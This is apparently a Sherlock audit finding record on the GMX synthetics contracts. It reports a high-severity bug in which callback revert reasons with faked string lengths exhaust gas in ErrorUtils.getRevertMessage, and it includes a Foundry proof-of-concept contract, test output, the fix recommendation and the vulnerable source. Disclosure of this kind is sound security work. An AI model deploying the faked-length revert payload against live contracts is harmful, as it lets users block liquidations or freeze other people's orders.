{
  "Title": "H-8: Malicious revert reasons with faked lengths can disrupt order execution",
  "Content": "# Issue H-8: Malicious revert reasons with faked lengths can disrupt order execution \n\nSource: https://github.com/sherlock-audit/2023-02-gmx-judging/issues/139 \n\n## Found by \n0xdeadbeef, IllIllI\n\n## Summary\n\nMalicious revert reasons with faked lengths can be used in the various order callbacks to disrupt order execution\n\n\n## Vulnerability Detail\n\nFor most order-related operations, the user is allowed to provide the address of a contract on which a callback is triggered, whenever anything related to an order changes. These callbacks are executed with a limited amount of gas, under a try-catch block, in order to ensure that the user-supplied callback cannot affect subsequent processing. Whenever the callback reverts, the revert reason is fetched so that it can be emitted.\n\nThe code that parses the return bytes uses `abi.decode(result, (string))` to parse the \"string\", which relies on the first word of the data, to figure out how many bytes long the string is. Because the `results` variable is a memory variable, rather than calldata, any read past the end of the bytes is allowed, and is considered as value zero byte slots. If a malicious callback provides a reason \"string\" that is only a few bytes long, but sets the length to a very large number, when the decode call is made, it will try to read a string of that provided length, and will eventually run out of gas.\n\nNote that this is not the same as providing an actual long string, because in that case, the callback will revert with an out of gas error, and there won't be a string to parse.\n\n\n## Impact\n\nA malicious user can use this attack in many different places, but they all stem from the bug in `ErrorUtils.getRevertMessage()`. One such attack would be that a user can prevent themselves from being liquidated or ADLed, by providing a malicious string in the revert reason in their [CallbackUtils.afterOrderExecution()](https://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/order/OrderUtils.sol#L168) callback.\n\nOthere places include the freezing of orders, bypassing pauses by having resting orders that can never execute until allowed, and preventing orders from being canceled when their normal execution reverts.\n\n\n## Code Snippet\n\nThe input `result` is a memory variable, and it uses `abi.decode()` without checking the string's length against the calldata length, or any sort of maximum:\n```solidity\n// File: gmx-synthetics/contracts/utils/ErrorUtils.sol : ErrorUtils.getRevertMessage()   #1\n\n6         // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577\n7  @>     function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {\n8             // If the result length is less than 68, then the transaction either panicked or failed silently\n9             if (result.length < 68) {\n10                return (\"\", false);\n11            }\n12    \n13            bytes4 errorSelector = getErrorSelectorFromData(result);\n14    \n15            // 0x08c379a0 is the selector for Error(string)\n16            // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/\n17            if (errorSelector == bytes4(0x08c379a0)) {\n18                assembly {\n19                    result := add(result, 0x04)\n20                }\n21    \n22 @>             return (abi.decode(result, (string)), true);\n23            }\n24    \n25            // error may be a custom error, return an empty string for this case\n26            return (\"\", false);\n27:       }\n```\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/utils/ErrorUtils.sol#L7-L27\n\n\nThe following test shows how this can be used to cause a revert, even when the gas to the callback is limited. I show two cases - one where there is no external wrapping of the calldata, and one where there is. Most of the examples of `getRevertMessage()` are the unwrapped variety, but some like the ones for `executeDeposit()` and `executeWithdrawal()` are wrapped, and would require the attack to also be applied to the cancellation callback, since those are unwrapped:\n\n\n```solidity\npragma solidity 0.8.17;\n\nimport \"forge-std/Test.sol\";\n\ncontract BigString is Test {\n\n    function test_unwrapped() external view returns (uint256) {\n        try this.strFakedString{gas:10240}() {\n        //try this.strFakedString() {\n        //try this.strBigString{gas:10240}() {\n        //try this.strNoIssue() {\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = getRevertMessage(reasonBytes);\n            return 1;\n        }\n        return 0;\n    }\n    \n    function test_wrapped() external view returns (uint256) {\n        try this.test_unwrapped() {\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = getRevertMessage(reasonBytes);\n            return 1;\n        }\n        return 0;\n    }\n\n    function strNoIssue() external pure returns (string memory) {\n        assembly {\n            mstore(0, 0x20)\n            mstore(0x27, 0x07536561706f7274)\n            revert(0, 0x60)\n        }\n    }\n    function strBigString() external pure returns (string memory) {\n        bytes memory str = new bytes(100000000000);\n\trevert(string(str));\n    }\n\n    function strFakedString() external pure returns (string memory) {\n        assembly {\n            let free_mem_ptr := mload(64)\n            mstore(free_mem_ptr, 0x08c379a000000000000000000000000000000000000000000000000000000000)\n            mstore(add(free_mem_ptr, 4), 32)\n            //mstore(add(free_mem_ptr, 36), 12) // original\n            mstore(add(free_mem_ptr, 36), 100000000000) // out of gas\n            mstore(add(free_mem_ptr, 68), \"Unauthorizedzzzzzz\")\n            revert(free_mem_ptr, 100)\n        }\n    }\n\n    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {\n        bytes4 errorSelector;\n\n        assembly {\n            errorSelector := mload(add(data, 0x20))\n        }\n\n        return errorSelector;\n    }\n    // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577\n    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {\n        // If the result length is less than 68, then the transaction either panicked or failed silently\n        if (result.length < 68) {\n            return (\"\", false);\n        }\n\n        bytes4 errorSelector = getErrorSelectorFromData(result);\n\n        // 0x08c379a0 is the selector for Error(string)\n        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/\n        if (errorSelector == bytes4(0x08c379a0)) {\n            assembly {\n                result := add(result, 0x04)\n            }\n\n            return (abi.decode(result, (string)), true);\n        }\n\n        // error may be a custom error, return an empty string for this case\n        return (\"\", false);\n    }\n}\n```\n\nOutput:\n\n```shell\n$ forge test -vvvv\n[⠰] Compiling...\nNo files changed, compilation skipped\n\nRunning 2 tests for src/T.sol:BigString\n[FAIL. Reason: EvmError: OutOfGas] test_unwrapped():(uint256) (gas: 9223372036854754743)\nTraces:\n  [2220884625] BigString::test_unwrapped() \n    ├─ [257] BigString::strFakedString() [staticcall]\n    │   └─ ← 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000174876e800556e617574686f72697a65647a7a7a7a7a7a0000000000000000000000000000\n    └─ ← \"EvmError: OutOfGas\"\n\n[PASS] test_wrapped():(uint256) (gas: 9079256848778899476)\nTraces:\n  [9079256848778899476] BigString::test_wrapped() \n    ├─ [2220884625] BigString::test_unwrapped() [staticcall]\n    │   ├─ [257] BigString::strFakedString() [staticcall]\n    │   │   └─ ← 0x08c379a00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000174876e800556e617574686f72697a65647a7a7a7a7a7a0000000000000000000000000000\n    │   └─ ← \"EvmError: OutOfGas\"\n    └─ ← 1\n\nTest result: FAILED. 1 passed; 1 failed; finished in 628.44ms\n\nFailing tests:\nEncountered 1 failing test in src/T.sol:BigString\n[FAIL. Reason: EvmError: OutOfGas] test_unwrapped():(uint256) (gas: 9223372036854754743)\n\nEncountered a total of 1 failing tests, 1 tests succeeded\n```\n\n## Tool used\n\nManual Review\n\n\n## Recommendation\n\nHave an upper limit on the length of a string that can be passed back, and manually update the length if the string's stated length is greater than the max.\n\n\n\n\n\n## Discussion\n\n**xvi10**\n\nFix in https://github.com/gmx-io/gmx-synthetics/commit/b0bac262191f4f96edc9606192d2e4abfa043dc3\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/6",
  "Code": [
    {
      "filename": "gmx-synthetics/contracts/order/OrderUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../data/DataStore.sol\";\nimport \"../data/Keys.sol\";\n\nimport \"./Order.sol\";\nimport \"./OrderVault.sol\";\nimport \"./OrderStoreUtils.sol\";\nimport \"./OrderEventUtils.sol\";\n\nimport \"../nonce/NonceUtils.sol\";\nimport \"../oracle/Oracle.sol\";\nimport \"../oracle/OracleUtils.sol\";\nimport \"../event/EventEmitter.sol\";\n\nimport \"./IncreaseOrderUtils.sol\";\nimport \"./DecreaseOrderUtils.sol\";\nimport \"./SwapOrderUtils.sol\";\nimport \"./BaseOrderUtils.sol\";\n\nimport \"../swap/SwapUtils.sol\";\n\nimport \"../gas/GasUtils.sol\";\nimport \"../callback/CallbackUtils.sol\";\n\nimport \"../utils/Array.sol\";\nimport \"../utils/ReceiverUtils.sol\";\nimport \"../referral/ReferralUtils.sol\";\n\n// @title OrderUtils\n// @dev Library for order functions\nlibrary OrderUtils {\n    using Order for Order.Props;\n    using Position for Position.Props;\n    using Price for Price.Props;\n    using Array for uint256[];\n\n    error OrderTypeCannotBeCreated(Order.OrderType orderType);\n    error OrderAlreadyFrozen();\n    error InsufficientWntAmountForExecutionFee(uint256 wntAmount, uint256 executionFee);\n\n    // @dev creates an order in the order store\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param account the order account\n    // @param params BaseOrderUtils.CreateOrderParams\n    function createOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        IReferralStorage referralStorage,\n        address account,\n        BaseOrderUtils.CreateOrderParams memory params\n    ) external returns (bytes32) {\n        ReferralUtils.setTraderReferralCode(referralStorage, account, params.referralCode);\n\n        uint256 initialCollateralDeltaAmount;\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        bool shouldRecordSeparateExecutionFeeTransfer = true;\n\n        if (\n            params.orderType == Order.OrderType.MarketSwap ||\n            params.orderType == Order.OrderType.LimitSwap ||\n            params.orderType == Order.OrderType.MarketIncrease ||\n            params.orderType == Order.OrderType.LimitIncrease\n        ) {\n            initialCollateralDeltaAmount = orderVault.recordTransferIn(params.addresses.initialCollateralToken);\n            if (params.addresses.initialCollateralToken == wnt) {\n                if (initialCollateralDeltaAmount < params.numbers.executionFee) {\n                    revert InsufficientWntAmountForExecutionFee(initialCollateralDeltaAmount, params.numbers.executionFee);\n                }\n                initialCollateralDeltaAmount -= params.numbers.executionFee;\n                shouldRecordSeparateExecutionFeeTransfer = false;\n            }\n        } else if (\n            params.orderType == Order.OrderType.MarketDecrease ||\n            params.orderType == Order.OrderType.LimitDecrease ||\n            params.orderType == Order.OrderType.StopLossDecrease\n        ) {\n            initialCollateralDeltaAmount = params.numbers.initialCollateralDeltaAmount;\n        } else {\n            revert OrderTypeCannotBeCreated(params.orderType);\n        }\n\n        if (shouldRecordSeparateExecutionFeeTransfer) {\n            uint256 wntAmount = orderVault.recordTransferIn(wnt);\n            if (wntAmount < params.numbers.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.numbers.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                orderVault,\n                wntAmount,\n                params.numbers.executionFee\n            );\n        }\n\n        // validate swap path markets\n        MarketUtils.getEnabledMarkets(\n            dataStore,\n            params.addresses.swapPath\n        );\n\n        Order.Props memory order;\n\n        order.setAccount(account);\n        order.setReceiver(params.addresses.receiver);\n        order.setCallbackContract(params.addresses.callbackContract);\n        order.setMarket(params.addresses.market);\n        order.setInitialCollateralToken(params.addresses.initialCollateralToken);\n        order.setSwapPath(params.addresses.swapPath);\n        order.setOrderType(params.orderType);\n        order.setDecreasePositionSwapType(params.decreasePositionSwapType);\n        order.setSizeDeltaUsd(params.numbers.sizeDeltaUsd);\n        order.setInitialCollateralDeltaAmount(initialCollateralDeltaAmount);\n        order.setTriggerPrice(params.numbers.triggerPrice);\n        order.setAcceptablePrice(params.numbers.acceptablePrice);\n        order.setExecutionFee(params.numbers.executionFee);\n        order.setCallbackGasLimit(params.numbers.callbackGasLimit);\n        order.setMinOutputAmount(params.numbers.minOutputAmount);\n        order.setIsLong(params.isLong);\n        order.setShouldUnwrapNativeToken(params.shouldUnwrapNativeToken);\n\n        ReceiverUtils.validateReceiver(order.receiver());\n\n        if (order.initialCollateralDeltaAmount() == 0 && order.sizeDeltaUsd() == 0) {\n            revert BaseOrderUtils.EmptyOrder();\n        }\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, order.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteOrderGasLimit(dataStore, order);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, order.executionFee());\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        order.touch();\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderCreated(eventEmitter, key, order);\n\n        return key;\n    }\n\n    // @dev executes an order\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function executeOrder(BaseOrderUtils.ExecuteOrderParams memory params) external {\n        BaseOrderUtils.validateNonEmptyOrder(params.order);\n\n        BaseOrderUtils.setExactOrderPrice(\n            params.contracts.oracle,\n            params.market.indexToken,\n            params.order.orderType(),\n            params.order.triggerPrice(),\n            params.order.isLong()\n        );\n\n        processOrder(params);\n\n        OrderEventUtils.emitOrderExecuted(params.contracts.eventEmitter, params.key);\n\n        CallbackUtils.afterOrderExecution(params.key, params.order);\n\n        // the order.executionFee for liquidation / adl orders is zero\n        // gas costs for liquidations / adl is subsidised by the treasury\n        GasUtils.payExecutionFee(\n            params.contracts.dataStore,\n            params.contracts.orderVault,\n            params.order.executionFee(),\n            params.startingGas,\n            params.keeper,\n            params.order.account()\n        );\n    }\n\n    // @dev process an order execution\n    // @param params BaseOrderUtils.ExecuteOrderParams\n    function processOrder(BaseOrderUtils.ExecuteOrderParams memory params) internal {\n        if (BaseOrderUtils.isIncreaseOrder(params.order.orderType())) {\n            IncreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isDecreaseOrder(params.order.orderType())) {\n            DecreaseOrderUtils.processOrder(params);\n            return;\n        }\n\n        if (BaseOrderUtils.isSwapOrder(params.order.orderType())) {\n            SwapOrderUtils.processOrder(params);\n            return;\n        }\n\n        BaseOrderUtils.revertUnsupportedOrderType();\n    }\n\n    // @dev cancels an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to cancel\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason for cancellation\n    function cancelOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (BaseOrderUtils.isIncreaseOrder(order.orderType()) || BaseOrderUtils.isSwapOrder(order.orderType())) {\n            if (order.initialCollateralDeltaAmount() > 0) {\n                orderVault.transferOut(\n                    order.initialCollateralToken(),\n                    order.account(),\n                    order.initialCollateralDeltaAmount(),\n                    order.shouldUnwrapNativeToken()\n                );\n            }\n        }\n\n        OrderStoreUtils.remove(dataStore, key, order.account());\n\n        OrderEventUtils.emitOrderCancelled(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderCancellation(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            order.executionFee(),\n            startingGas,\n            keeper,\n            order.account()\n        );\n    }\n\n    // @dev freezes an order\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param orderVault OrderVault\n    // @param key the key of the order to freeze\n    // @param keeper the keeper sending the transaction\n    // @param startingGas the starting gas of the transaction\n    // @param reason the reason the order was frozen\n    function freezeOrder(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        OrderVault orderVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Order.Props memory order = OrderStoreUtils.get(dataStore, key);\n        BaseOrderUtils.validateNonEmptyOrder(order);\n\n        if (order.isFrozen()) {\n            revert OrderAlreadyFrozen();\n        }\n\n        uint256 executionFee = order.executionFee();\n\n        order.setExecutionFee(0);\n        order.setIsFrozen(true);\n        OrderStoreUtils.set(dataStore, key, order);\n\n        OrderEventUtils.emitOrderFrozen(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterOrderFrozen(key, order);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            orderVault,\n            executionFee,\n            startingGas,\n            keeper,\n            order.account()\n        );\n\n    }\n}"
    },
    {
      "filename": "gmx-synthetics/contracts/utils/ErrorUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nlibrary ErrorUtils {\n    // To get the revert reason, referenced from https://ethereum.stackexchange.com/a/83577\n    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {\n        // If the result length is less than 68, then the transaction either panicked or failed silently\n        if (result.length < 68) {\n            return (\"\", false);\n        }\n\n        bytes4 errorSelector = getErrorSelectorFromData(result);\n\n        // 0x08c379a0 is the selector for Error(string)\n        // referenced from https://blog.soliditylang.org/2021/04/21/custom-errors/\n        if (errorSelector == bytes4(0x08c379a0)) {\n            assembly {\n                result := add(result, 0x04)\n            }\n\n            return (abi.decode(result, (string)), true);\n        }\n\n        // error may be a custom error, return an empty string for this case\n        return (\"\", false);\n    }\n\n    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {\n        bytes4 errorSelector;\n\n        assembly {\n            errorSelector := mload(add(data, 0x20))\n        }\n\n        return errorSelector;\n    }\n\n    function revertWithParsedMessage(bytes memory result) internal pure {\n        (string memory revertMessage, bool hasRevertMessage) = getRevertMessage(result);\n\n        if (hasRevertMessage) {\n            revert(revertMessage);\n        } else {\n            revertWithCustomError(result);\n        }\n    }\n\n    function revertWithCustomError(bytes memory result) internal pure {\n        // referenced from https://ethereum.stackexchange.com/a/123588\n        uint256 length = result.length;\n        assembly {\n            revert(add(result, 0x20), length)\n        }\n    }\n}"
    }
  ]
}